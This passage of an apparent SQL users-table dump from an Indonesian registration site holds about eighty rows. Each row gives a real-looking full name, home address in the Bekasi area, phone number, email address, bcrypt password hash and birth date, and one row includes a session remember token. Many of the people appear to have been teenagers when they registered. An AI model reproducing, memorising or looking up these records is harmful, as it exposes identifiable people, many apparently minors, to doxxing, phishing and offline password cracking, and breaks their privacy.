(61, 'Taufik Gamal', 'Trias estate Blok E4 No6', '081386755650', 0, 'tzanuar0@gmail.com', '2019-11-28 00:12:34', '$2y$10$N5ClV04mTr0qIfzB7iER5uaA5Ll9/had2A4DhZZz7azbAkigvbGcC', 'Laki-Laki', '2019-09-28', NULL, '2019-11-28 00:11:07', '2019-11-28 00:12:34'),
(62, 'Aprilianti', 'Jl. Sindang Jaya', '08812383604', 0, 'apriliayanti59@gmail.com', '2019-11-28 01:48:38', '$2y$10$EpmaQ5K5.5KQSsUikrOqaufpd2Tb3BJhen1vEPd9tR.2AlPKTVC1e', 'Perempuan', '2003-04-02', NULL, '2019-11-28 01:47:07', '2019-11-28 01:48:38'),
(63, 'Deave Thomas', 'Perum griya asri 2', '089666193039', 0, 'deavethomas78@gmail.com', '2019-11-28 02:36:44', '$2y$10$h0CAzyegfJM4sKxuwwH4NugcOp8sT9XHOrotTfiDEsJx3T1Eoxx02', 'Laki-Laki', '2003-07-31', NULL, '2019-11-28 02:36:04', '2019-11-28 02:36:44'),
(64, 'Pramana Pangestu', 'Griya Asri 2 tambun Selatan', '081284530850', 0, 'pramanapangestu30@gmail.com', '2019-11-28 09:29:56', '$2y$10$35o7.j7/g8MPHlvqrqAbPe/prgd1LbQJWxEYBSsmQoGaiW3wN8y.q', 'Laki-Laki', '2002-07-26', NULL, '2019-11-28 09:28:30', '2019-11-28 09:29:56'),
(65, 'Shafira maulidina', 'Jl raya mangun jaya rt 004 rw 013', '082112709675', 0, 'shafiramaulidinaa@gmail.com', '2019-11-28 15:20:36', '$2y$10$qmdc6TbhAfTmWe8Bz800n.vB6SzrOVaK9TPJphoWFBAbwZrFc5Zfy', 'Perempuan', '2000-05-03', NULL, '2019-11-28 15:18:30', '2019-11-28 15:20:36'),
(66, 'Riska Amalia', 'Villa 1 B10/11, Mangunjaya, Tambun selatan, bekasi', '082121448725', 0, 'riskaamalia172@gmail.com', '2019-11-29 02:30:45', '$2y$10$OvpMCd4Ayo/ZNbBJqbGY9eou.UDj2sRSmCRR8PgHR/KDjHJ2riR22', 'Perempuan', '2001-05-18', NULL, '2019-11-29 02:30:00', '2019-11-29 02:30:45'),
(67, 'mrd', 'Biak', '08963215499', 0, 'mr.d1234@gmail.com', NULL, '$2y$10$knVZ/Ouogi2M1zySrJkLuOu4rRaQ1..Ng86H7PPYRGntggUOiHAka', 'Perempuan', '2020-11-29', NULL, '2019-11-29 02:36:03', '2019-11-29 02:36:03'),
(68, 'Tamadieta bunga kinanti', 'Taman tridaya indah blok B7/9', '082122952118', 0, 'tamadieta97@gmail', '2019-11-28 18:00:00', '$2y$10$5XayqmENP1BaFeydX4s8qeUpvxlHRhkORWl7Kxx12uTd4/DlJqS0C', 'Perempuan', '2002-01-09', NULL, '2019-11-29 02:36:18', '2019-11-29 02:36:18'),
(69, 'Yuda ramadani', 'Bekasi Griya Pratama blok c2 no 8', '083890525702', 0, 'nbltsaniya@gmail.com', '2019-11-29 02:44:14', '$2y$10$06BaidZvNUUYfPg/aO9RNOQR9ORI3CtFMHqyQumL30k6xyGhxeZAe', 'Laki-Laki', '2000-12-01', NULL, '2019-11-29 02:38:29', '2019-11-29 02:44:14'),
(70, 'Muhammad Putra Naufal', 'Jl. P. Natuna 5 no 118 aren Jaya Bekasi timur', '089672544309', 0, 'mputra031101@gmail.com', '2019-11-28 18:00:00', '$2y$10$.qdhlJWeP7vUBdUIG55K/upAlTaWbgX3Ihm.yhnwWwCiFidWnshT6', 'Laki-Laki', '2001-11-03', NULL, '2019-11-29 02:39:24', '2019-11-29 02:39:24'),
(71, 'BayuAji', 'Perum alinda kencana 1', '081224192087', 0, 'bayuajipangestu2002@gmail.com', '2019-11-29 02:44:18', '$2y$10$gNWGL4KcT5B5OhIbIU/4X.evwZKJirq4CJFLmvCGzGOJkH3GHUEXe', 'Laki-Laki', '2002-09-19', NULL, '2019-11-29 02:43:19', '2019-11-29 02:44:18'),
(72, 'Arasya salshabila', 'perum graha prima blok id no 336', '089504013913', 0, 'salshabilaara@gmail.com', '2019-11-29 02:46:26', '$2y$10$ZhxxNCRCcvmC8VZZRcE8huRhntkU96XQcoEt4DZME50uq2/WRdeDC', 'Perempuan', '2001-04-19', NULL, '2019-11-29 02:45:44', '2019-11-29 02:46:26'),
(73, 'Alya Ardiningrum Azra', 'Puri Cendana', '089652401968', 0, 'alyaazra0901@gmail.com', '2019-11-29 02:49:47', '$2y$10$Fxwz.eSidJQT9iUVRTBnLejV3OSEmndtvHiU9Wj5a.5SXU.pCFG3i', 'Perempuan', '2004-01-09', NULL, '2019-11-29 02:46:43', '2019-11-29 02:49:47'),
(74, 'Anitarahayu', 'Perumahan villa mutiara blok L 15 no 14 rt 003 rw 034 cibitung bekasi', '081319423232', 0, 'anitarhy231@gmail.com', '2019-11-29 02:52:52', '$2y$10$mnPt5.9XYoQxJurqjUf.A.O12Jv8uTSjaHwgObrfONp4t4G4Dxl.u', 'Perempuan', '2001-03-02', NULL, '2019-11-29 02:51:31', '2019-11-29 02:52:52'),
(75, 'Amanda Salcha Billa', 'Kp.Kalibaru no.42 rt.003 rw.012 Desa Mekarsari. Kec.Tambun Selatan Kab.Bekasi 17510', '08989716298', 0, 'amandasalcha01@gmail.com', '2019-11-29 02:57:06', '$2y$10$56PVXnBTGpTNaGHigNqSsOxvO.ITLl6iASZLRqkq9bmYy6wh9gsqe', 'Perempuan', '2002-11-19', NULL, '2019-11-29 02:56:16', '2019-11-29 02:57:06'),
(76, 'Raifatul fikriah', 'Cibitung', '089517625798', 0, 'fikriahrf24@gmail.com', '2019-11-29 03:01:27', '$2y$10$R8ynm01IVw6QzAm3v6c4A.m39Io.n2hAxE2aALUgPTs0w4EwVQemC', 'Perempuan', '2000-12-24', NULL, '2019-11-29 02:58:55', '2019-11-29 03:01:27'),
(77, 'Lah', '-', '08', 0, 'gg@gmail.com', NULL, '$2y$10$0scjt8XciG6qaTOnMjerFuOTFeLfc0.Mf58itEppep6D8EfPYosm2', 'Laki-Laki', '2019-11-29', NULL, '2019-11-29 03:05:30', '2019-11-29 03:05:30'),
(78, 'Muhammad Satrio Dwi Utomo', 'Griya Asri 3 blok j18/22', '081395341919', 0, 'satriodwiutomo300502@gmail.com', '2019-11-29 03:07:37', '$2y$10$cGhJ5f3/FIlRP2K62FKzMuHXyTSHevdPJ6mVhp8QIZz8U4tacpOIy', 'Laki-Laki', '2002-05-30', NULL, '2019-11-29 03:06:58', '2019-11-29 03:07:37'),
(79, 'jonathan eka', 'Perumahan taman kebayoran blok. N 53, Tambun', '081388494213', 0, 'jonathantube02@gmail.com', '2019-11-29 03:14:45', '$2y$10$9OgjImEdOf1362NMKPXT1OqCNHTIzS87m4/Phug8K3iixEUB2mH5e', 'Laki-Laki', '2002-08-03', NULL, '2019-11-29 03:14:10', '2019-11-29 03:14:45'),
(80, 'Sonia Ardi', 'villa mutiara jayaa', '089603831067', 0, 'soniayapink@gmail.com', '2019-11-29 03:19:40', '$2y$10$oKOcNnj7Vu1Ml0CV5GR4Jut8IRE33UCv0zOf9uIfHTfdByawKJKIK', 'Perempuan', '2000-09-11', NULL, '2019-11-29 03:15:03', '2019-11-29 03:19:40'),
(81, 'sella oktavia', 'Gg damai', '081296630604', 0, 'selloktaviaa20@gmail.com', '2019-11-28 18:00:00', '$2y$10$UD4Rb9PEMXsQvoIC4Gpuj.MPMMudbkW08Jz8NJ/gVMmYeLvqgWNCS', 'Perempuan', '1999-10-18', NULL, '2019-11-29 03:17:38', '2019-11-29 03:17:38'),
(82, 'Tito Satria W', 'Perum Regensi 2', '085314078786', 0, 'titosatriaw10@gmail.com', '2019-11-29 03:20:58', '$2y$10$ZxJMmeKxvQNF3.FASDrm3ej9jJpbupTfk591MwUW.W/IPLQfksZDu', 'Laki-Laki', '2000-12-31', NULL, '2019-11-29 03:18:26', '2019-11-29 03:20:58'),
(83, 'Tester', 'Bekasi', '001318484', 0, 'imgoonep@gmail.com', '2019-11-29 03:20:47', '$2y$10$Xe6YAeEGaMoAo/0h2xYb4uB.6cvt.mTk576Cg6zPOcBTM53UYb3ly', 'Laki-Laki', '2019-11-29', NULL, '2019-11-29 03:19:23', '2019-11-29 03:20:47'),
(84, 'Pipin Yoga Arya Pratama', 'Perumahan bekasi regensi 2', '087870960097', 0, 'yogaarya0228@gmail.com', '2019-11-29 03:24:09', '$2y$10$rdiFqw9iGA3yG63a7sTlCeH/BuRvQOUPRJFCTwh5wwOWM3Le3Wu2S', 'Laki-Laki', '2001-08-28', NULL, '2019-11-29 03:23:11', '2019-11-29 03:24:09'),
(85, 'Dorii', 'Jalan jambrut 5 no 67 rawalumbu', '085889636812', 0, 'anggisuga8100@gmail.com', '2019-11-28 18:00:00', '$2y$10$0CBDA.ev56FowM/pAmHTyugRHc6uonZkoNTJFNhmXKSe9pyWeyHiS', 'Perempuan', '2003-09-10', NULL, '2019-11-29 03:26:57', '2019-11-29 03:26:57'),
(86, 'Shafira Aprillia', 'mutiara gadng timur', '08987143293', 0, 'shafiraaprilliaaa@gmail.com', '2019-11-29 03:31:09', '$2y$10$7V1kVDzTeqlxDKyk40o2XOoAe3jjf/rv0ujeOwHMRk3mZcI84xWzK', 'Perempuan', '2003-04-04', NULL, '2019-11-29 03:28:33', '2019-11-29 03:31:09'),
(87, 'Paskahria Theresia', 'Taman Kebalen Indah Blok F 5 no 9', '087883957193', 0, 'paskahriatheresia@gmail.com', '2019-11-29 03:29:58', '$2y$10$EhQtIOG47W/VNxxApq.JiOsgLzYdlnIH7nFtHC/UC6gaBPxzrn9Ym', 'Perempuan', '2003-04-14', NULL, '2019-11-29 03:29:21', '2019-11-29 03:29:58'),
(88, 'Dhafa laksito aji', 'Taman raya, blok f3 no 11', '089508231409', 0, 'dhafa.aji29@gmail.com', '2019-11-29 03:34:00', '$2y$10$kfC4NZ0XexXgB5bpVq5iAOdmSvIqh2qC4e3BzLFxUyGcaI64J5Xx2', 'Laki-Laki', '2004-09-09', NULL, '2019-11-29 03:30:29', '2019-11-29 03:34:00'),
(89, 'Ninda Kurnia Putri', 'Graha melasti baru blok CA3 no 8', '081281187202', 0, 'nindakurniaputri@gmail.com', '2019-11-29 03:34:27', '$2y$10$giNoCVlIouKxwjMyMMfrwOpL4JxLOWeK3yFEpNLvzRmRqcCVQ/Pc.', 'Perempuan', '1994-06-16', NULL, '2019-11-29 03:33:36', '2019-11-29 03:34:27'),
(90, 'Ketut Kamayoga', 'Metland tambun, cluster fontania blok m1 no 14', '088214171617', 0, 'Ketutkamayoga21@gmail.com', '2019-11-29 04:13:51', '$2y$10$U8RhVJolUBxn1sUw0djX4OwfMrcz6k3iJK/x6/rolwac9glPziFS.', 'Laki-Laki', '2003-09-02', NULL, '2019-11-29 03:34:59', '2019-11-29 04:13:51'),
(91, 'Dori', 'Jalan jambrut 5 no 67 rawalumbu bekasi', '085889636812', 0, 'yonggidaegu09@gmail.com', '2019-11-29 03:37:51', '$2y$10$C50J52ynTsk.jwjiqXNWOubY4VCtNcp6CCbsYtHncWkMc9Ovg9NAy', 'Laki-Laki', '2003-09-10', NULL, '2019-11-29 03:37:12', '2019-11-29 03:37:51'),
(92, 'muhammadamiirulbilaal', 'bekasi timur, tambun selatan, perumahan bekasi griya pratama blok c9 no5 rt04 rw033', '08970068009', 0, 'muhammadamiirulbilaal@gmail.com', '2019-11-28 18:00:00', '$2y$10$Jxt92tcaU.s.nhi0KilxjeUPQvoGSwpBoVjgD9XIrStDon.GpstO6', 'Laki-Laki', '2003-01-19', NULL, '2019-11-29 03:40:11', '2019-11-29 03:40:11'),
(93, 'Raditya Ariyanto', 'Perumahan Puri Cendana Blok B21 no 8', '08881140238', 0, 'radityaariyanto.19@gmail.com', '2019-11-29 03:42:11', '$2y$10$1K.LMIIIJERpGJJa.4i/Q.wZrgi3ZwTbgoZvV6s8oNAoXfIwsvu7a', 'Laki-Laki', '2000-12-31', NULL, '2019-11-29 03:41:30', '2019-11-29 03:42:11'),
(94, 'Hendranata', 'Kp.Kedung gede RT 01/001 No.12 Ds.Setia Mekar', '081379481218', 0, 'hendranata868@gmail.com', '2019-11-29 03:44:47', '$2y$10$3Bkr/NGpkzJ3/MgADo3f0.1yUJUREsGL57IJnLfnPlUbk3qfqvggu', 'Laki-Laki', '2002-06-09', NULL, '2019-11-29 03:44:07', '2019-11-29 03:44:47'),
(95, 'muhammadamiirulbilaal', 'bekasi', '08970068009', 0, 'muhammadamiirulbilaal15@gmail.com', '2019-11-29 03:48:36', '$2y$10$hEi.vQNmTpbK.540rOTtuu4vuXymOcIo7z1mynDRqjGAAeRnGITkq', 'Laki-Laki', '2003-01-19', NULL, '2019-11-29 03:46:11', '2019-11-29 03:48:36'),
(96, 'Eka sapta', 'Tridaya nuansa', '085218726201', 0, 'eka1997abbkz@gmail.com', '2019-11-29 03:48:46', '$2y$10$WPSC8xflU8m/NWPzp2AHwed29T.Zc/0hwuk0cqs/ClEPqmjkwuA1u', 'Laki-Laki', '2001-02-17', NULL, '2019-11-29 03:46:37', '2019-11-29 03:48:46'),
(97, 'Nabilla Dwi Rahayu', 'Ditinggal', '087856333265', 0, 'nabilladwii44@gmail.com', '2019-11-29 03:47:16', '$2y$10$93ry.ZBDl4kN/eOpA85FH.pX.wMP.IT18u5deKjpiqWLTeagagMe2', '-- Pilih Jenis Kelamin --', '2001-08-14', NULL, '2019-11-29 03:46:45', '2019-11-29 03:47:16'),
(98, 'Cantika', 'Disini', '081323086509', 0, 'mrl0c4d@gmail.com', '2019-11-29 03:49:39', '$2y$10$xoGe2vq0ix7PzYhYAi1WUe5FLxXDbXzfCM0x/qi0y79x9e4RHtxW.', 'Laki-Laki', '2019-11-29', NULL, '2019-11-29 03:48:35', '2019-11-29 03:49:39'),
(99, 'Dimas Setiawan', 'Alamanda Regency blok M9 no 18', '081289547391', 0, 'dimas.set1507@gmail.com', '2019-11-29 03:52:11', '$2y$10$kzcSDVETkqvAcETb0VJnkOSPF8jEQHA3andF9cjKREFYn3PQCG0WG', 'Laki-Laki', '2001-07-15', NULL, '2019-11-29 03:49:50', '2019-11-29 03:52:11'),
(100, 'Daffa Fahrezi', 'No 146 Kp.irian wisma asri 2 teluk Pucung Bekasi Utara kota bekasi', '089635673853', 0, 'daffafahrezi76@gmail.com', '2019-11-29 03:53:02', '$2y$10$S5OM9kbBMU1RKq1LKwpZqOhIoCapIfj0tRfyPKVW7I2nl2rkA9WM.', 'Laki-Laki', '2002-03-20', NULL, '2019-11-29 03:52:23', '2019-11-29 03:53:02'),
(101, 'Muhammad Usamah ALFarouq', 'Puri Harapan Blok D17 No.10 Bekasi Utara', '083872682751', 0, 'usamahfarouq@gmail.com', '2019-11-29 04:12:55', '$2y$10$aL.GHoYarKwytVTukDKK.exG2L9kpOOJPG3Txm/2ri.IgWm/g615e', 'Laki-Laki', '2002-09-11', NULL, '2019-11-29 03:53:16', '2019-11-29 04:12:55'),
(102, 'Agung Rahmat Laksono', 'Jl kali baru no 16 rt 02 rw 02 ds mekarsari tambun selatan', '0895339965902', 0, 'agungrahmatlaksono@gmail.com', '2019-11-29 04:01:24', '$2y$10$QSpo4PbRk1W6Y3QGZMCBs.y2R0gfQbAg9vozYXQ15hb7kvG/PsgSO', 'Laki-Laki', '2000-05-30', NULL, '2019-11-29 03:59:05', '2019-11-29 04:01:24'),
(103, 'Timotius Jonathan', 'Jl. Mawar 2 Blok B15 No.10, Taman Tridaya', '082261060957', 0, 'timotius.jonathan95@gmail.com', '2019-11-29 04:00:36', '$2y$10$2jNTt14L/8rThyeQ3K8VDO8FeOgErji1ubj3Wq9Z08XtameHiWiy.', 'Laki-Laki', '2002-11-21', NULL, '2019-11-29 04:00:09', '2019-11-29 04:00:36'),
(104, 'Denisa Retno Fitriani', 'Perumahan Graha Prima Blok F6 No.27', '0895700262004', 0, 'denisa.retno3@gmail.com', '2019-11-29 04:04:57', '$2y$10$KqlZzz8M9Vn8kTkRj3Eovul51RGeh9JHxU0lgmo5UbNvNPs6xMInq', 'Perempuan', '2001-01-08', NULL, '2019-11-29 04:03:58', '2019-11-29 04:04:57'),
(105, 'Sri wahyuni', 'Perum. Pesona pulo indah blok d1 no.15 rt002/053', '08976815104', 0, 'loginbiggest@yahoo.com', NULL, '$2y$10$C4AHmgVVoXK6D36ljL4aweSuid5K2z4aO38ZYX7uK.O/tsZoENiMy', 'Perempuan', '2001-02-18', NULL, '2019-11-29 04:05:59', '2019-11-29 04:05:59'),
(106, 'Jihad', 'Jalan lumbu tengah 1c rawalumbu', '081315406703', 0, 'zihadilhammubarok100@gmail.com', '2019-11-28 18:00:00', '$2y$10$RxodOBIcN8hdiQMzcyytCOiEyks70P4UZPKGgE1HG8KJ3vG7jHYSu', 'Perempuan', '2003-01-10', NULL, '2019-11-29 04:07:21', '2019-11-29 04:07:21'),
(107, 'Fatra Faiza', 'Perum Wali Barokah Blok E no 5,Sumber Jaya, Tambun Selatan,Bekasi', '087875322352', 0, 'fatrafaiza2003@gmail.com', '2019-11-29 04:10:16', '$2y$10$WX.VgCtAAr1BkkjHw6VafeAkeSiLcLU1BAHsM0A.9/l7ilPxCln0u', 'Perempuan', '2003-10-25', NULL, '2019-11-29 04:09:36', '2019-11-29 04:10:16'),
(108, 'Pratama arif hidayat', 'Villa mutiara jaya blok m33 no 6 rt 05 rw 09 Wanajaya, Cibitung, Kab. Bekasi 17520', '0895389721162', 0, 'arifhidayat2738@gmail.com', '2019-11-29 04:11:34', '$2y$10$AWDlA/6wXpf/jnXAh7et5.XW5cr5CehYFEp0YMOREpe7nMRiimAdy', 'Laki-Laki', '2000-09-27', NULL, '2019-11-29 04:10:58', '2019-11-29 04:11:34'),
(109, 'Yohana tri puspita', 'Papan mas blok b', '089508386406', 0, 'yohanatrip@gmail.com', '2019-11-29 04:20:24', '$2y$10$1PxlWk4VP2/87XFRJB5PkejcBU9j6T92DB4hF1eFRX/UQS.AEJDIi', 'Perempuan', '2000-12-30', NULL, '2019-11-29 04:20:01', '2019-11-29 04:20:24'),
(110, 'Sri wahyuni', 'Perum. Pesona pulo indah blok d1 no.15 rt002/053', '08976815104', 0, 'Wahyuni180201@gmail.com', '2019-11-29 04:27:39', '$2y$10$yneCOUd0jTacSyVh1j37Leb9AANn9UMh3rg5CtnUY5loRh8Ot/zUG', 'Perempuan', '2001-02-18', NULL, '2019-11-29 04:25:36', '2019-11-29 04:27:39'),
(111, 'Muhammad Ibnu Bahi', 'Desa setia mekar blok F46 NO 2 perumahan papanmas rt 6 rw 6\r\nTambun Selatan, Kab. Bekasi, 17510', '0895342836754', 0, 'ibnubahi@gmail.com', '2019-11-29 04:27:40', '$2y$10$4TqTudAbYfue8QNjYBBcdOhecaw4zjPpJp6SY54m9gr6HgIgdWSvi', 'Laki-Laki', '2002-07-18', NULL, '2019-11-29 04:27:12', '2019-11-29 04:27:40'),
(112, 'Dinda Rachmawati', 'Perumahan Bumi Sani Permai Blok K4/10', '081210883413', 0, 'ddddinda8@gmail.com', '2019-11-29 04:29:57', '$2y$10$3V3ytZtWUOVEnIZjNvih6.p6mmIAc/dSRp9hAuYyMXXRF6Z6f5kZK', 'Perempuan', '2001-03-16', NULL, '2019-11-29 04:29:00', '2019-11-29 04:29:57'),
(113, 'Bambank', 'Prum. Gramapuri Taman Sari Jl. Nusa indah 7 Blok i6/06', '082211313465', 0, 'frnciscus@gmail.com', NULL, '$2y$10$mFrVi0R49B4t7l2pvp23O.7T8SrOTkDuKFAZDVDbmCt8RDpA65Myq', 'Laki-Laki', '2002-10-28', NULL, '2019-11-29 04:41:16', '2019-11-29 04:41:16'),
(114, 'Refi Agustry suratno', 'Perum. Bumi lestari blok H60', '082123674910', 0, 'refiagus.83@gmail.com', '2019-11-29 04:45:22', '$2y$10$ndwigLsOjlET4pooMKiZ/OwjXqE3Gv1MY13T9t6E4f9w/rqDmGFVG', 'Laki-Laki', '2003-08-26', NULL, '2019-11-29 04:44:36', '2019-11-29 04:45:22'),
(115, 'Maylina Miftahul Hasanah', 'Perumahan Regensi 1 Blok I6 No.5 Rt 03 Rw 07 Kel. Wanasari Kec. Cibitung', '085718779802', 0, 'maylinamift@gmail.com', NULL, '$2y$10$Fq3nEAKLsYAr5swVjecdCuY2sZpUbmXENroYUSHjCgRWdxKPlMPum', 'Perempuan', '2001-05-30', NULL, '2019-11-29 04:44:46', '2019-11-29 04:44:46'),
(116, 'Fathan Hafizh', 'Vida Bekasi, bumipala taman durian jl durian 12 blok d7 no 5a', '08816860539', 0, 'fathanhafizh24@gmail.com', '2019-11-29 04:49:08', '$2y$10$uvlGdRCmHSyU4y0d1OnkZeBXRH2JOtqXUPHLrwzBqj0sSh7hU41yK', 'Laki-Laki', '2001-09-24', NULL, '2019-11-29 04:48:44', '2019-11-29 04:49:08'),
(117, 'Bhambank', 'Prum. Gramapuri Taman Sari Jl. Nusa indah 7 Blok i6/07', '082211313465', 0, 'francscs28@gmail.com', '2019-11-29 06:08:52', '$2y$10$MTqd.ow97SuoXFV4FGeNWuQWV0i2iOcUeP.BRXMSeOTQ1Zw0uMCCO', 'Laki-Laki', '2002-10-28', NULL, '2019-11-29 04:49:02', '2019-11-29 06:08:52'),
(118, 'Rossidah Nursyafitri', 'Perum. Tridaya Indah 3', '089637329481', 0, 'rossisyftr@gmail.com', '2019-11-29 04:53:42', '$2y$10$WyNQSW0ah4dc7lTlswH.oebY.KXMIs/NNjKgcFun6EOpPSjDCDmcm', 'Perempuan', '2002-12-14', NULL, '2019-11-29 04:50:56', '2019-11-29 04:53:42'),
(119, 'Ale Muhammad', 'Gramapuri Taman sari block c410 Cibitung Bekasi', '08161665060', 0, 'alemuhammad11@gmail.com', '2019-11-29 04:55:10', '$2y$10$fwzHnxCupicAtxGkhuyV4.SUXhgBMEh6rEI/Eobez3LzbH6NbFUDm', 'Laki-Laki', '1998-02-04', NULL, '2019-11-29 04:53:24', '2019-11-29 04:55:10'),
(120, 'Zidhan tri kusuma', 'Jl. Sadariah rt5/17 No 91', '0895331855734', 0, 'zidhantrikusuma16@gmail.com', '2019-11-29 04:54:22', '$2y$10$NSRscDCghbwXoUU5uv2U2uxUvO2wX1XIdu0WDKlCv2bDCNCipYLiS', 'Laki-Laki', '2003-05-16', NULL, '2019-11-29 04:53:42', '2019-11-29 04:54:22'),
(121, 'Regina Zwasti Irawan', 'PERUMAHAN GRIYA ASRI 1 BLOK A8 NO 15, BEKASI, TAMBUN SELATAN', '08388935856', 0, 'idolkaede18@gmail.com', '2019-11-29 05:20:22', '$2y$10$DYAmhzcYdT75a3okhGAnUehWUO5Um.SY5AbDYDat0QHw7QSmnStba', 'Perempuan', '2004-02-18', 'xhkcEmf9LCJoiQlyeXJMZzE4rc5a6xY9qg072Vp55liIb9zJDiKncK52ilqX', '2019-11-29 04:58:00', '2019-12-23 14:38:24'),
(122, 'Regina Swasti Irawan', 'PERUMAHAN GRIYA ASRI 1 BLOK A8 NO 15 BEKASI TAMBUN SELATAN', '083889356856', 0, 'reginazwastiirawan@gmail.com', NULL, '$2y$10$qzP/MSBo7yDgTkMzlllBKOYPnIkFwh.WmKKxlPvWW5uIhHF8pkiOq', 'Perempuan', '2004-02-18', NULL, '2019-11-29 05:05:02', '2019-11-29 05:05:02'),
(123, 'Azri Amrima Putra', 'Puri Cendana No.45', '083872965376', 0, 'azriputra63@gmail.com', '2019-11-29 05:07:49', '$2y$10$XUL6jMQxrxLwoAwoOZP30uu14JU8nbcTXECeLntaS6WZZLeZ1bO9C', 'Laki-Laki', '1999-12-17', NULL, '2019-11-29 05:06:26', '2019-11-29 05:07:49'),
(124, 'Pramana Pangestu', 'Griya Asri 2', '081284530850', 0, 'nfspram123@gmail.com', '2019-11-29 05:24:31', '$2y$10$yQFKBCXTF7BZE6aU9K0MMuiIFAa9UJpffoNWoViWYWG5dkK9LrNv.', 'Laki-Laki', '2002-11-26', NULL, '2019-11-29 05:24:04', '2019-11-29 05:24:31'),
(125, 'Aresh Kurniawan', 'Mangun jaya indah 2', '081290404929', 0, 'areshkurniawan17@gmail.com', '2019-11-29 05:25:27', '$2y$10$IYl7z.yNlHpPIrGlIX8Rn.Pipu42ancRrNUlpPIe5qNqFzrphnu06', 'Laki-Laki', '2000-12-22', NULL, '2019-11-29 05:24:13', '2019-11-29 05:25:27'),
(126, 'Alvina retno wardhani', 'Perum. Alam pesona wanajaya cibitung blok p23 no.17', '085947768513', 0, 'alvinartn21@gmail.com', '2019-11-29 05:39:27', '$2y$10$FWpuZomLKKm.oaCMA8.XgeerCzk8HpqeqERRbB3FSjNVrWJqhcH/2', 'Perempuan', '2001-08-21', NULL, '2019-11-29 05:31:55', '2019-11-29 05:39:27'),
(127, 'Jizdan Rizkiardi', 'Bekasi', '081381796079', 0, 'jizdanjr10@gmail.com', '2019-11-29 05:36:42', '$2y$10$2yaZsM3xNZcxwBzTDcx3B.55ljQLVNGs23koECLgMegDCrQayPqkm', 'Laki-Laki', '2002-05-10', NULL, '2019-11-29 05:32:33', '2019-11-29 05:36:42'),
(128, 'Galang', 'Perumahan telaga harapan blok b 22 no 1 Cikarang barat, kab Bekasi, Jawa barat, Indonesia, planet bumi', '081993724194', 0, 'galanghendrwan@gmail.com', '2019-11-29 05:34:55', '$2y$10$APhyUSVC3NU4VpAcC/BDoO2saa0SclIbYGyDvig.Ah2znMYE4Vcnq', 'Laki-Laki', '2001-03-14', NULL, '2019-11-29 05:34:21', '2019-11-29 05:34:55'),
(129, 'Liana lufansa fauzie', 'Gramapuri cibitung', '089604357224', 0, 'lianalufansafauzie73@yahoo.co.id', NULL, '$2y$10$yfzIR/ZfJCqQSIs1AEmq7.wybpEBQkjwAT/O9oENUad4jQ5eSg4G2', 'Perempuan', '2001-07-06', NULL, '2019-11-29 05:38:56', '2019-11-29 05:38:56'),
(130, 'Pramudika', 'Griya asri 2 blok e16 no 21', '087779275277', 0, 'pramudika.ulfans@gmail.com', '2019-11-29 05:41:06', '$2y$10$5RQu68mFgi0Kk8KrcWoHx.LIW00SBbweuSnAirYhCRAOh6GmkzMku', 'Laki-Laki', '2003-08-28', NULL, '2019-11-29 05:40:34', '2019-11-29 05:41:06'),
(131, 'anandaichls', 'Graha prima baru blok L6 no.12b tambun selatan', '085216515615', 0, 'anandaichls25@gmail.com', NULL, '$2y$10$vzuT9Ap5AK1hilZHgI2gGepJAvccXbauXaqLYOxu6TgpQxvSKOoa.', 'Laki-Laki', '2000-04-23', NULL, '2019-11-29 05:40:39', '2019-11-29 05:40:39'),
(132, 'ananda ichls', 'Graha prima baru Blok L6 no.12b tambun selatan', '085216515615', 0, '20180810082@uniku.ac.id', '2019-11-29 07:01:30', '$2y$10$OIZc9oDbfPpT91A7TEBZFeBzH2ojUztEbQekjCDvLaBMAOZtEIX6u', 'Laki-Laki', '2000-04-23', NULL, '2019-11-29 05:49:40', '2019-11-29 07:01:30'),
(133, 'Raendi Putra Mahreza', 'Pondok ungu bekasi', '0895331117534', 0, 'rendiptramhrza@gmail.com', '2019-11-29 05:55:23', '$2y$10$WPym3Pkp5cOGn4CCf8iQnu3Hohx57bR5QRNrVdrc3scoB3hikixEq', 'Laki-Laki', '2001-07-25', NULL, '2019-11-29 05:54:53', '2019-11-29 05:55:23'),
(134, 'Retsa Annisa', 'Taman raya bekasi P1/19', '081283835849', 0, 'retsa.annisa97@gmail.com', '2019-11-29 05:57:08', '$2y$10$unQecWRLMMprh.MyTOJhqeNxc6NVrzHE1gCSHOPJHepmIwJFN39cm', 'Perempuan', '2001-07-09', NULL, '2019-11-29 05:55:46', '2019-11-29 05:57:08'),
(135, 'Ananda Muthia Putri', 'Jl.Perumahan Graha Prima Baru Blok S1 1E,Mangun Jaya,Tambun Selatan', '08889628300', 0, 'muthiananda12@gmail.com', '2019-11-29 06:01:55', '$2y$10$k1wKg3sHfbFsryQ0181JWOLH.VggXttS7vDMOqnPkR1xbL0sSBarm', 'Perempuan', '2001-12-24', NULL, '2019-11-29 06:00:32', '2019-11-29 06:01:55'),
(136, 'Shepira Apriliani', 'Kp.kalibaru rt.003 rw.012 Mekarsari', '08989716298', 0, 'shepiraapriliani96@gmail.com', NULL, '$2y$10$DMkNG4UxQB0J9OTSzZ8nnexgqns6nwRW5D.9VcQanW0q4x3izzTPe', 'Perempuan', '2002-11-19', NULL, '2019-11-29 06:02:24', '2019-11-29 06:02:24'),
(137, 'Ratih Nurjannah', 'Perum. Villa 2 Bekasi', '089637329481', 0, 'Ratihnurjannah123@gmail.com', NULL, '$2y$10$go2SVqhWs0Sp/3N/Utco0O0WYwuksWD9maG9zG8UVNvvGgs9BCuzq', 'Perempuan', '2002-11-04', NULL, '2019-11-29 06:07:28', '2019-11-29 06:07:28'),
(138, 'Fernanda dwi santosa', 'Perumahan Grand Residence Cluster Tirtayasa AC 1 NO 3\r\nKelurahan Cijengkol\r\nKecamatan Setu\r\nKabupaten Bekasi \r\nKode Pos 17320', '081314042809', 0, 'fernandadwisantosa@gmail.com', '2019-11-29 06:10:15', '$2y$10$eLMIsUtFkM1bHa5bzmu/PeJ6qWxt0WLvAcwpAgYnRYVoAaJ9J6ImC', 'Laki-Laki', '1997-12-22', NULL, '2019-11-29 06:09:35', '2019-11-29 06:10:15'),
(139, 'Shepira Apriliani', 'kp.kalibaru rt.003 rw.012 Mekarsari', '08989716298', 0, 'shefiraapriliani69@gmail.com', NULL, '$2y$10$HvmWWusp9NJRC.29z5q1CufQIDQy30QnRn5.k2pVvEGSyNwx6.Ft.', 'Perempuan', '2002-04-21', NULL, '2019-11-29 06:10:17', '2019-11-29 06:10:17'),
